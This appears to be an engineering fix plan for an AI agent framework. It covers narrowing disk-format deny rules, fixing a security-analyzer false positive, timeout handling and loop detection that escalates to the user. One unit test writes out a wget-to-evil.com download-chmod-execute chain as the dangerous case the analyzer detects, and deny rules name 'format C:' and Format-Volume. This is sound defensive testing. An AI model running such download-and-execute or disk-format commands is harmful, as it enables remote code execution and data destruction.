# Execution Reliability Fix Plan

**Date:** 2026-06-01  
**Branch:** `feat/execution-reliability`  
**Status:** Draft  
**Scope:** 8 identified issues from the traced `find largest files` session

---

## Executive Summary

The trace revealed a cascade failure caused by a combination of overly broad security rules, silently-ignored tool parameters, and a planner that receives no diagnostic context when a step fails. The agent burned 25 steps without making progress, hitting the same blocked patterns repeatedly, with no mechanism to detect the loop and escalate to the user.

These fixes are grouped into three layers: **Security** (false positives), **Tool contracts** (timeout honesty), and **Agent intelligence** (loop detection + failure-context propagation). Every change targets a single, existing file and respects the Clean Architecture dependency rule (changes flow inward: Interfaces → Infrastructure → Application → Domain).

---

## Issue Index

| # | Severity | Layer | File | Description |
|---|----------|-------|------|-------------|
| 1 | Critical | Core | `weebot/core/approval_policy.py` | `"format"` substring DENY blocks PowerShell and Python |
| 2 | Critical | Tools | `weebot/tools/bash_security.py` | Layer 2 behavioral false positive on `temp` path + any pipe |
| 3 | High | Tools | `weebot/tools/powershell_tool.py` | `timeout` param ignored — hardcoded 30 s; must target `_run_async()` (Phase C.1 async path) |
| 4 | High | Tools | `weebot/tools/bash_tool.py` + `config/tool_config.py` | Timeout coercion bug + configurable ceiling via `ToolConfig` (Phase C.2 decoupling) |
| 5 | High | Application | `weebot/application/agents/executor.py` | No policy-error-loop detection; only identical-signature detection |
| 6 | High | Application | `weebot/application/flows/states/updating.py` | Planner receives no failure reason; re-generates identical step |
| 7 | Medium | Application | `weebot/application/agents/executor.py` | System prompt has no PowerShell syntax guidance |
| 8 | Low | Tools | `powershell_tool.py`, `bash_tool.py` | Tool descriptions don't advertise effective timeout ceiling |

---

## Fix 1 — Narrow the `format` DENY rule in `ExecApprovalPolicy`

**File:** `weebot/core/approval_policy.py`

### Root Cause

`_DEFAULT_RULES` contains:
```python
CommandRule("format", ApprovalMode.DENY, ...)
```
This uses a plain substring match (line 92: `if rule.pattern.lower() in cmd_lower`), which fires on **any** occurrence of the word "format":
- `Format-Table` (PowerShell display cmdlet — completely safe)  
- `str.format()` and f-strings in Python code  
- `ConvertTo-Html` output that mentions "format" in its body  
- HTML content strings with inline CSS properties

### Fix

Convert both `format`-related rules to regex patterns so they only match the Windows disk format command:

```python
# Before
CommandRule("format", ApprovalMode.DENY,
            undo_hint="Formatting is irreversible. Use Diskpart carefully."),
CommandRule("format-volume", ApprovalMode.DENY,
            undo_hint="Formatting is irreversible. Use Diskpart carefully."),

# After
CommandRule(r"\bformat\s+[a-zA-Z]:", ApprovalMode.DENY, is_regex=True,
            undo_hint="Formatting is irreversible. Use Diskpart carefully."),
CommandRule(r"\bFormat-Volume\b", ApprovalMode.DENY, is_regex=True,
            undo_hint="Formatting is irreversible. Use Diskpart carefully."),
```

### Rationale

`\bformat\s+[a-zA-Z]:` matches `format C:`, `format D:`, etc. but never `Format-Table`, `str.format()`, or any code string. `\bFormat-Volume\b` captures the full PowerShell cmdlet name. Both use word boundaries to avoid partial-word collisions.

### Tests to Write

```python
# tests/unit/test_approval_policy.py
def test_format_table_is_allowed():
    policy = ExecApprovalPolicy()
    result = policy.evaluate("Get-ChildItem | Format-Table -AutoSize")
    assert result.approved

def test_format_drive_is_denied():
    policy = ExecApprovalPolicy()
    result = policy.evaluate("format C: /Q")
    assert not result.approved

def test_python_format_string_is_allowed():
    policy = ExecApprovalPolicy()
    result = policy.evaluate('print("value: {}".format(x))')
    assert result.approved

def test_format_volume_is_denied():
    policy = ExecApprovalPolicy()
    result = policy.evaluate("Format-Volume -DriveLetter D")
    assert not result.approved
```

---

## Fix 2 — Fix Layer 2 behavioral analysis false positive

**File:** `weebot/tools/bash_security.py`

### Root Cause

`_layer2_behavioral_analysis` at line 252–254:
```python
has_indicator = bool(tokens & indicators)
has_target = bool(tokens & targets) or bool(operators & {'|', '&&', '||'})
```

The `or bool(operators & ...)` clause makes `has_target` true for **any** command that contains a pipe, AND or OR operator. Combined with `_SUSPICIOUS_COMBINATIONS[2]`:
```python
({'temp', 'tmp', 'mktemp'}, {'chmod', '+x', 'execute'}, "temp file execution"),
```
Any command with a path containing `/temp/` or `\temp\` **and** a pipe operator (even an unrelated one) is flagged as `DANGEROUS` — e.g.:
```
powershell.exe ... -FilePath 'E:\temp\largest_files.txt' | Out-File ...
```

### Fix

Remove the operator-based broadening from `has_target`. The operator check was intended only for download-to-shell patterns, which are already handled by the explicit `download_execute_patterns` regex block above the combination loop.

```python
# Before
has_indicator = bool(tokens & indicators)
has_target = bool(tokens & targets) or bool(operators & {'|', '&&', '||'})

# After
has_indicator = bool(tokens & indicators)
has_target = bool(tokens & targets)
```

The download-execute detection (download tool → `|` → shell) is already correctly handled by the `download_execute_patterns` regex list (lines 228–236), which uses precise full-pattern matching. The combination loop is redundant for those cases and only introduced false positives.

### Tests to Write

```python
# tests/unit/test_bash_security.py
def test_temp_path_with_pipe_is_not_flagged():
    analyzer = CommandSecurityAnalyzer()
    result = analyzer.analyze(
        "powershell -Command \"Select-Object | Out-File 'C:\\temp\\out.txt'\""
    )
    assert result.risk_level != RiskLevel.DANGEROUS

def test_actual_temp_execute_chain_is_flagged():
    analyzer = CommandSecurityAnalyzer()
    result = analyzer.analyze(
        "wget http://evil.com/script.sh -O /tmp/x && chmod +x /tmp/x && /tmp/x"
    )
    assert result.risk_level == RiskLevel.DANGEROUS
```

---

## Fix 3 — Honor `timeout` in `PowerShellBaseTool`

**File:** `weebot/tools/powershell_tool.py`

### Architecture Note

This tool was converted to async in Phase C.1 of the Architecture Excellence Plan.
The primary execution path is `_run_async()` (uses `asyncio.create_subprocess_exec`),
not `_run()` (sync wrapper for backward compatibility). Fix 3 must target `_run_async()`
to correctly thread timeout through both the SandboxPort path and the fallback path.

The timeout ceiling should come from `ToolConfig` (Phase C.2), not from a hardcoded
constant or `WeebotSettings` import.

### Root Cause

`PowerShellBaseTool` schema declares no `timeout` field and its `execute()` method
ignores any timeout kwarg silently. Both `_run_async()` (async primary path) and the
SandboxPort path use hardcoded 30s. The agent passes `'timeout': '300'` or `'timeout': 120`
but these are never used.

### Fix

**Step A** — Add `timeout` to `PowerShellBaseTool.parameters`:

```python
# PowerShellBaseTool — accept ToolConfig for ceiling
from weebot.config.tool_config import ToolConfig

async def _run_async(self, command: str, timeout: float = 30.0) -> str:
    effective_timeout = min(float(timeout), self._get_max_timeout())
    ...
    try:
        stdout, stderr = await asyncio.wait_for(
            proc.communicate(), timeout=effective_timeout
        )
    except asyncio.TimeoutError:
        ...

def _get_max_timeout(self) -> float:
    """Read max timeout from ToolConfig if injected, otherwise default 300."""
    if self._tool_config is not None:
        return float(self._tool_config.max_tool_timeout)
    return 300.0
```

**Step B** — Keep `parameters` update as below:

```python
parameters: dict = {
    "type": "object",
    "properties": {
        "command": {"type": "string", "description": "PowerShell command to execute"},
        "timeout": {"type": "number", "description": "Timeout in seconds (default 30, max 300)"},
    },
    "required": ["command"],
}
```

**Step C** — Thread `timeout` through `PowerShellBaseTool.execute()` (both paths):

```python
async def execute(self, command: str, timeout: Optional[float] = None, **_) -> _ToolResult:
    # ── Security validation (unchanged) ──
    ...

    effective_timeout = float(timeout) if timeout is not None else 30.0
    ceiling = self._inner._get_max_timeout() if hasattr(self._inner, '_get_max_timeout') else 300.0
    effective_timeout = min(effective_timeout, ceiling)

    # SandboxPort path:
    if self._sandbox_port is not None and _SANDBOX_PORT_AVAILABLE:
        s_result = await self._sandbox_port.execute_shell(
            script=command, shell="powershell", timeout=effective_timeout,
        )
        ...

    # Fallback path — uses _run_async, which now accepts timeout:
    output = await self._inner._run_async(command, timeout=effective_timeout)
```

**Step D** — Update description to state the ceiling:
```python
_POWERSHELL_DESC = (
    "Execute a PowerShell command on Windows 11. "
    "Accepts optional 'timeout' in seconds (default: 30, max: 300). "
    ...
)
```

### Tests to Write

```python
@pytest.mark.asyncio
async def test_powershell_tool_respects_timeout_param():
    tool = PowerShellBaseTool()
    result = await tool.execute("Write-Output 'hello'", timeout=5)
    assert not result.is_error

@pytest.mark.asyncio
async def test_powershell_tool_clamps_timeout_to_ceiling():
    tool = PowerShellBaseTool()
    # Built-in ceiling should clamp unreasonable values
    result = await tool.execute("Write-Output 'hello'", timeout=9999)
    assert not result.is_error  # Should complete, not hang
```

---

## Fix 4 — Bash tool timeout coercion bug + configurable ceiling

**Files:** `weebot/tools/bash_tool.py`, `weebot/config/tool_config.py`

### Architecture Note

BashTool was decoupled from `WeebotSettings` in Phase C.2 of the Architecture
Excellence Plan. It now receives configuration via `ToolConfig` injected through
`set_config()`. The timeout ceiling must be added to `ToolConfig`, NOT to
`WeebotSettings`, to avoid re-coupling the tool layer to the settings singleton.

### Root Cause

`BashTool.execute()` signature is `timeout: Optional[float] = None`, but the LLM passes `'90'` as a JSON string. At line 399:
```python
effective_timeout = timeout if timeout is not None else self._default_timeout
```
`"90"` is not `None`, so `effective_timeout = "90"` (a string). When passed to `SandboxedExecutor.run()`, the subprocess layer likely catches the type error and falls back to a default ceiling (empirically 60 s based on the trace), silently discarding the caller's intent.

Additionally, `ToolConfig` has no `max_tool_timeout` field, so there is no way to raise
the ceiling without touching `WeebotSettings` directly.

### Fix

**Step A** — Add `max_tool_timeout` to `weebot/config/tool_config.py`:

```python
@dataclass(frozen=True)
class ToolConfig:
    """Configuration values consumed by tool adapters."""
    bash_timeout: int = 30
    python_timeout: int = 30
    sandbox_max_output_bytes: int = 65_536
    max_tool_timeout: int = 300   # env: MAX_TOOL_TIMEOUT — ceiling for all tool timeout params

    def __post_init__(self):
        if not (30 <= self.max_tool_timeout <= 3600):
            raise ValueError("max_tool_timeout must be between 30 and 3600")
```

**Step B** — Update `WeebotSettings` to populate `ToolConfig.max_tool_timeout` at creation:

```python
# In weebot/config/settings.py — add the env field
class WeebotSettings(BaseSettings):
    ...
    max_tool_timeout: int = 300   # env: MAX_TOOL_TIMEOUT

# In di.py — thread the value into ToolConfig
@staticmethod
def _create_tool_config() -> ToolConfig:
    settings = WeebotSettings()
    return ToolConfig(
        bash_timeout=settings.bash_timeout,
        python_timeout=settings.python_timeout,
        sandbox_max_output_bytes=settings.sandbox_max_output_bytes,
        max_tool_timeout=settings.max_tool_timeout,
    )
```

**Step C** — Apply coercion and ceiling in `BashTool.execute()`, reading from injected `ToolConfig`:

```python
try:
    effective_timeout = float(timeout) if timeout is not None else float(self._default_timeout)
except (TypeError, ValueError):
    effective_timeout = float(self._default_timeout)
effective_timeout = min(effective_timeout, float(settings.max_tool_timeout))
```

**Step D** — Update `.env.example`:

```dotenv
# Maximum seconds any single bash/python tool call may run (default 300)
MAX_TOOL_TIMEOUT=300
```

**Step E** — Update tool description to expose the ceiling:

```python
description: str = (
    "Execute a shell command. Uses PowerShell on Windows or WSL2 bash. "
    "Accepts optional 'timeout' in seconds (default: 30, ceiling set by MAX_TOOL_TIMEOUT env var, "
    "default ceiling: 300). Commands exceeding the ceiling are killed."
    ...
)
```

### Tests to Write

```python
@pytest.mark.asyncio
async def test_bash_tool_coerces_string_timeout():
    tool = BashTool()
    result = await tool.execute("echo hello", timeout="60")
    assert not result.is_error

@pytest.mark.asyncio
async def test_bash_tool_clamps_to_max():
    tool = BashTool()
    result = await tool.execute("echo hello", timeout=9999)
    assert not result.is_error
```

---

## Fix 5 — Policy-error-loop detection in `ExecutorAgent`

**File:** `weebot/application/agents/executor.py`

### Root Cause

The existing loop guard (line 401–416) only fires when the **exact same tool signature** is repeated ≥4 times. In the trace, the agent tried 15+ different tool call signatures — different commands, different approaches — that all failed with `"Command denied by policy: format"`. Since no two calls were identical, the guard never triggered, and the full 25-step budget was consumed.

### Fix

Add a secondary stuck detector: track consecutive errors by **error class** (policy-denied, security-blocked, timeout). If the same error class fires ≥ `_MAX_SAME_ERROR_CLASS` consecutive tool calls, abort the step early and surface a `WaitForUserEvent` so the user can intervene.

**Step A** — Add error-class classification helper and counter to `execute_step()`:

```python
_MAX_SAME_ERROR_CLASS = 3   # class constant

# Inside execute_step(), alongside existing counters
consecutive_error_class_counts: dict[str, int] = {}
last_error_class: Optional[str] = None

def _classify_tool_error(error_output: str) -> Optional[str]:
    """Return a stable error-class key for grouping, or None if not an error."""
    if not error_output:
        return None
    lo = error_output.lower()
    if "denied by policy" in lo or "command blocked" in lo:
        return "policy_denied"
    if "security error" in lo or "layer" in lo and "triggered" in lo:
        return "security_blocked"
    if "timed out" in lo:
        return "timeout"
    if "access denied" in lo or "permission" in lo:
        return "permission_denied"
    return None
```

**Step B** — After each tool result, check the counter:

```python
result = await self._execute_tool_call(tc)
...
if result.is_error:
    err_class = _classify_tool_error(result.error or result.output)
    if err_class:
        if err_class == last_error_class:
            consecutive_error_class_counts[err_class] = \
                consecutive_error_class_counts.get(err_class, 0) + 1
        else:
            consecutive_error_class_counts = {err_class: 1}
            last_error_class = err_class

        if consecutive_error_class_counts.get(err_class, 0) >= self._MAX_SAME_ERROR_CLASS:
            loop_error = (
                f"Step '{step.id}' is stuck: the same error class '{err_class}' "
                f"has triggered {consecutive_error_class_counts[err_class]} consecutive times. "
                f"Last error: {result.error or result.output}. "
                "The step cannot proceed under current security/policy constraints. "
                "Requesting user input to unblock."
            )
            yield ErrorEvent(error=loop_error)
            yield WaitForUserEvent(
                question=(
                    f"The agent is blocked by a '{err_class}' policy and cannot proceed "
                    f"with step: {step.description!r}.\n"
                    f"Last error: {result.error or result.output}\n\n"
                    "Please either:\n"
                    "  1. Rephrase the task to avoid the blocked operation, or\n"
                    "  2. Adjust security settings if appropriate, then resume."
                )
            )
            return
else:
    last_error_class = None
    consecutive_error_class_counts.clear()
```

### Rationale

This preserves Clean Architecture: the logic lives entirely inside the Application layer's `ExecutorAgent`, uses existing domain events (`ErrorEvent`, `WaitForUserEvent`), and has no new external dependencies. The threshold of 3 is a reasonable balance — low enough to abort fast, high enough to allow one legitimate retry.

### Tests to Write

```python
# tests/unit/test_executor_policy_loop.py
async def test_policy_loop_triggers_wait_for_user(mock_tools_always_deny):
    agent = ExecutorAgent(llm=mock_llm, tools=mock_tools_always_deny)
    events = [e async for e in agent.execute_step(plan, step)]
    wait_events = [e for e in events if isinstance(e, WaitForUserEvent)]
    assert len(wait_events) == 1
    assert "policy_denied" in wait_events[0].question
```

---

## Fix 6 — Pass failure context from `UpdatingState` to the planner

**Files:** `weebot/application/flows/states/updating.py`, `weebot/application/agents/planner.py`

### Root Cause

`UpdatePlanCommand` is dispatched with `reason=f"Step {last_step.id} completed: {last_step.status.value}"` (line 50–53). This gives the planner only the step ID and status string — no error message, no list of what was tried. The planner has no basis for changing its approach and generates an essentially identical step.

### Fix

Include the step's `result` field (populated by the executor with its last error or output) in the update reason, and add a structured `failure_context` key to the command payload:

```python
# UpdatingState.execute() — building the UpdatePlanCommand

failure_msg = ""
if last_step.status == StepStatus.FAILED and last_step.result:
    failure_msg = f" | Failure: {last_step.result[:500]}"  # cap length

cmd_result = await context._mediator.send(
    UpdatePlanCommand(
        session_id=context._session.id,
        updates={
            "last_step_id": last_step.id,
            "failure_context": last_step.result or "",
        },
        reason=(
            f"Step {last_step.id} {last_step.status.value}{failure_msg}. "
            "Generate a NEW approach that does not repeat the same strategy."
        ),
        model=context._model or "",
    )
)
```

The planner's `UpdatePlanCommand` handler should be updated to forward this `failure_context` into its prompt, explicitly instructing the LLM to **avoid** the same tool calls or patterns that were blocked.

**Planner update-prompt addendum** — append to the `update_plan()` method in
`weebot/application/agents/planner.py` (search for where the prompt string is
assembled, around the `"Update the plan"` instruction block):

```python
if failure_context:
    prompt += (
        f"\n\nThe previous step failed with: {failure_context}\n"
        "IMPORTANT: Do NOT attempt the same command or pattern. "
        "If the failure is a security policy block or timeout, redesign the step "
        "to use a fundamentally different approach (different tool, scoped query, or ask the user)."
    )
```

### Tests to Write

```python
# tests/unit/test_updating_state.py
async def test_failure_context_passed_to_planner(mock_mediator):
    failed_step = Step(..., status=StepStatus.FAILED, result="Command denied by policy: format")
    ...
    # Assert UpdatePlanCommand was called with failure_context containing the error
    call_args = mock_mediator.send.call_args
    assert "Command denied by policy" in call_args[0][0].reason
```

---

## Fix 7 — PowerShell syntax guidance in executor system prompt

**File:** `weebot/application/agents/executor.py`

### Root Cause

`EXECUTOR_SYSTEM_PROMPT` contains no PowerShell-specific syntax guidance. The planner generated `::Round($_.Length/1GB,2)` (invalid) instead of `[Math]::Round($_.Length/1GB,2)`, and kept repeating this broken syntax across all 25 tool attempts because the LLM has no in-prompt correction mechanism.

### Fix

Add a `POWERSHELL_GUIDANCE` section to the system prompt:

```python
EXECUTOR_SYSTEM_PROMPT = """You are an execution agent...

POWERSHELL SYNTAX RULES (Windows 11):
- Static .NET method calls: [ClassName]::MethodName() — e.g., [Math]::Round(x, 2)
  NOT ::Round(x, 2) which is invalid syntax.
- Format-Table, Format-List, Format-Wide are DISPLAY cmdlets, not disk operations — safe to use.
- Get-ChildItem full-disk recursion (-Recurse) on C:\\ takes several minutes;
  use -Depth 2 or -Depth 3 for faster partial scans, then widen if needed.
- PowerShell background jobs (Start-Job) are scoped to the current process and do NOT
  persist across separate powershell.exe invocations. Use single-call approaches instead.
- To write a multi-line script file, use Set-Content with a here-string @'...'@.
- Long timeout: set the 'timeout' parameter on the tool call (max 300s).
  Do NOT use Start-Sleep to work around the tool timeout.

...rest of prompt...
"""
```

This is additive and does not change any architectural dependency.

---

## Fix 8 — Advertise effective timeout ceiling in tool descriptions

**Files:** `weebot/tools/bash_tool.py`, `weebot/tools/powershell_tool.py`

Trivial one-line changes to the `description` strings:

```python
# bash_tool.py
description: str = (
    "Execute a shell command (PowerShell/WSL2). "
    "Pass 'timeout' in seconds (default: 30, effective max: MAX_TOOL_TIMEOUT env, default 300). "
    ...
)

# powershell_tool.py
_POWERSHELL_DESC = (
    "Execute a PowerShell command on Windows 11. "
    "Pass 'timeout' in seconds (default: 30, max: 300). "
    ...
)
```

---

## Implementation Order

Execute in this sequence to avoid regressions — each fix stands alone but later fixes depend on earlier ones being stable:

```
1. Fix 1  (approval_policy.py)          — unblocks Format-Table and Python code immediately
2. Fix 2  (bash_security.py)            — removes temp-path false positive
3. Fix 4  (tool_config.py + bash_tool.py) — timeout coercion + ceiling (shared infra, Fix 3 depends on this)
4. Fix 3  (powershell_tool.py)          — timeout threading through async _run_async() path
5. Fix 8  (description strings)         — docs only, zero risk
6. Fix 7  (executor system prompt)      — prompt-only, zero risk
7. Fix 5  (executor.py loop detection)  — new behavior, needs test coverage first
8. Fix 6  (updating.py + planner)       — last because it touches two files; requires Fix 5 tested
```

---

## Acceptance Criteria

A fix is complete when:

1. The specific unit tests listed under each fix pass.
2. `pytest tests/ -v` shows no regressions.
3. The traced session reproduced manually completes without hitting any of the 8 issues:
   - `Format-Table` is not blocked.
   - Python code with `str.format()` is not blocked.
   - Passing `timeout=120` to `bash`/`powershell` tools is honoured.
   - After 3 consecutive policy blocks, a `WaitForUserEvent` is emitted.
   - After replanning, the new step uses a different strategy (evidenced by a different tool call).

---

## Architecture Compliance

All fixes respect Clean Architecture dependency rules:

- **Domain layer** — not touched (no domain model changes needed)
- **Application layer** (Fixes 5–7) — changes stay within `agents/` and `flows/states/`;
  use existing domain events (`ErrorEvent`, `WaitForUserEvent`); no new external deps
- **Infrastructure/Tools layer** (Fixes 1–4, 8) — changes are local to tool files;
  config comes from `ToolConfig` (Phase C.2 pattern), not from `WeebotSettings` import
- **Interfaces layer** — not touched

Verified against the 18 architecture fitness tests: no new violations expected.

## Out of Scope

- `file_editor` workspace restriction (path policy outside workspace is correct security behaviour; the agent should use `bash`/`Set-Content` instead)
- Full LLM-layer semantic security analysis (Layer 4 async path already exists, not regressing it)
- Raising the default `bash_timeout` from 30 s (the default is correct; callers should pass an explicit `timeout` arg for long operations)
